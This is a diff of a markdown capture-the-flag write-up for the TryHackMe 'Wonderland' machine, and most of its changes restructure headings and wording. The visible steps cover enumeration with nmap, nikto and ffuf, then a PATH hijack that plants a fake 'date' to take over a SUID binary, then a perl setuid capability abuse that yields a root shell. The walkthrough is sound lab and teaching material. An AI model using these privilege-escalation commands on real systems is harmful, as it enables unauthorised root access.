@@ -2,26 +2,25 @@
 <!-- Description -->
 ![Wonderland](imgs/machine2.png)
 
-Completed on ??/??/20??
+Completed on 10/02/2023
 <!-- /Description -->
 ## Table of Contents
 <!-- TOC -->
-- [TryHackMe - Wonderland - WriteUp](#TryHackMe-Wonderland-Writeup)
+- [Wonderland - WriteUp](#wonderland-writeup)
   - [Table of Contents](#table-of-contents)
   - [Let's Get Going!](#lets-get-going)
-    - [Enumeration](#enumeration)
-      - [Nmap Scan](#nmap-scan)
-      - [Nikto Scan](#nikto-scan)
-      - [Directory Fuzzing](#directory-fuzzing)
-      - [Exploring Wonderland](#exploring-wonderland)
-      - [Sudoers](#sudoers)
-    - [Exploitation](#exploitation)
-    - [Post Exploitation](#post-exploitation)
+    - [Nmap Scan](#nmap-scan)
+    - [Nikto Scan](#nikto-scan)
+    - [Directory Fuzzing](#directory-fuzzing)
+    - [Exploring Wonderland](#exploring-wonderland)
+    - [Sudoers](#sudoers)
+    - [ELF x64](#elf-x64)
+    - [Root we get](#root-we-get)
+
 <!-- /TOC -->
 ---
 ## Let's Get Going
-### Enumeration
-#### Nmap Scan
+### Nmap Scan
 We start as usual with the nmap scan
 ```bash
 $ nmap -sC -sV -oN nmap/initial $IP     
@@ -44,7 +43,7 @@ As the port 80 is open, I decided to check the website myself.
 ![Wonderland](imgs/website.png)
 
 The page source reveals nothing and checking common file names and directories returned nothing. So I decided to continue with a nikto scan and some directory fuzzing with ffuf.
-#### Nikto Scan
+### Nikto Scan
 ```bash
 $ nikto -h http://$IP              
 - Nikto v2.1.6
@@ -67,7 +66,7 @@ $ nikto -h http://$IP
 + 1 host(s) tested
 ```
 The nikto scan returned no results.
-#### Directory Fuzzing
+### Directory Fuzzing
 ```bash
 $ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://$IP/FUZZ -e ".php,.html"      
 
@@ -119,7 +118,7 @@ $ ssh alice@$IP
 Last login: Mon May 25 16:37:21 2020 from 192.168.170.1
 alice@wonderland:~$
 ```
-#### Exploring Wonderland
+### Exploring Wonderland
 Executed some commands to gather info about the machine
 ```bash
 $ uname -a
@@ -152,9 +151,7 @@ $ ls /home
 alice  hatter  rabbit  tryhackme
 ```
 
----
-### Exploitation
-#### Sudoers 
+### Sudoers 
 One thing I always check when I get access to a new machine, is the command "sudo -l" since its really easy for the admin to mess up with it and allow us to get access to things we shouldn't. Lucky for me this was the case.
 ```bash
 $ sudo -l
@@ -197,7 +194,7 @@ and we got ourselves a shell as the user "rabbit"!
 $ whoami
 rabbit
 ```
-#### The Decoy
+### ELF x64
 After getting a shell as the new user, we start searching around to see what's available for us. After visiting "/home/rabbit", we find an executable file called "teaParty". We try running the file and we get the following output
 
 ![Wonderland](imgs/teaPartyoutput.png)
@@ -206,7 +203,7 @@ The script waits for us aswell to send some input in STDIN. After typing a rando
 
 ![Wonderland](imgs/teaPartyerror.png)
 
-This surely looks like a buffer overflow vulnerability! The executable has the SUID bit set as well which means that a successful exploitation could grant us root access. To continue we try and check if gdb is installed which was not the case. "readelf" tool which shows info about the executable was not installed either. Only thing we could do was to send the file to our machine and try and examine it locally (Even though it would be really hard to exploit the buffer overflow without a disassembler but maybe we could find something hidden in the file). After sending the file, we start by examining it:
+This surely looks like a buffer overflow vulnerability! The executable has the SUID bit set as well which means that a successful exploitation could grant us root access. To continue we try and check if gdb is installed which was not the case. "readelf" tool which shows info about the executable was not installed either. Only thing I could do was to send the file to my machine and try and examine it locally (even though it would be really hard to exploit the buffer overflow without a disassembler but perhaps I could find something hidden in the file). After sending the file, I started by checking the executable's headers:
 
 ```bash
 $ readelf -h teaParty
@@ -232,11 +229,11 @@ ELF Header:
   Section header string table index: 29
 ```
 
-So its a x64 ELF. Even though I hadn't wroked with other than x86 executables I wanted to give it a try. So let's disassemble it with gdb:
+So its an ELF x64 executable. Even though I hadn't wroked with anything other than x86 executables, I wanted to give it a try. I disassembled it with gdb:
 
 ![Wonderland](imgs/teaPartydisassembled.png)
 
-First thing that stood out to me was that there's no testing instructions (neither cmp nor test) so assuming that the file would print out something if our input was correct, is wrong. So what is this file really doing..? After putting in some breaks and checking the registers to see where the memory corruption was happening from our input, I found nothing in particular. No trace for our input in any critical register. So where's the "Segmentation fault" error coming from? I decided to break each "puts" instruction to see what it outputs (puts is used to write to stdout). After reaching the final puts i got the following
+First thing that stood out to me was that there's no testing instructions (neither cmp nor test) so assuming that the file would print out something if our input was correct, is wrong. So what is this file really doing..? After putting in some breaks and checking the registers to see where the memory corruption was happening from our input, I found nothing in particular. No trace for our input in any critical register. Where's this "Segmentation fault" error coming from? I decided to break each "puts" instruction to see what it outputs (puts is used to write strings to stdout). After reaching the final puts I got the following:
 ```
 (gdb) b *0x00005555555551bd
 Breakpoint 1 at 0x5555555551bd
@@ -278,7 +275,7 @@ So the program created a new process with PID 41543. We check it with the "ps" c
 $ ps -auxw | grep '41543'
 kali       41543  0.0  0.0   2524   400 pts/3    t    20:19   0:00 sh -c /bin/echo -n 'Probably by ' && date --date='next hour' -R
 ```
-So the program is executing a bash command! Its like we have a file ".sh" which is being run. If we manipulate the environment path we execute whatever we want! The steps go as follows:
+We can see that the program is actually executing a bash command! Its like we are running a shell script. If we manipulate the environment path we execute whatever we want! The exploitation steps went as follows:
 ```bash
 rabbit@wonderland:/tmp$ echo "/bin/bash ; " > /tmp/date
 rabbit@wonderland:/home/rabbit$ /bin/chmod +x /tmp/date
@@ -297,9 +294,9 @@ dircolors: command not found
 hatter@wonderland:/home/rabbit$ whoami
 hatter
 ```
-The shell command executed by the script calls command "date" without specifying the full path "/bin/date". The exploit would be to create our own executable "date" and change the environment path with export. Once the script calls "date", it will run the one we created. It would be basically creating a shell for us. And just like that we got ourselves a shell with user hatter
+The shell command executed by the ELF calls the command "date" without specifying the full path "/bin/date". The exploit would be to create our own command "date" and change the environment path with export. Once the script calls "date", it will run the one we created. It would be basically creating a shell for us. And just like that we got ourselves a shell with user hatter
 
-#### Root we get
+### Root we get
 Since we got access to every normal account on the machine, there was nothing left for us but to get root, which will secure for us the flags. After going through the usual privilege escalation checklist I found something interesting in capabilities
 ```bash
 $ getcap -r / 2>/dev/null
@@ -335,8 +332,6 @@ hatter@wonderland:~$ perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/b
 root@wonderland:~# whoami
 root
 ```
----
-### Post Exploitation
 ---
 
 > Any feedback would be appreciated. Thank you !
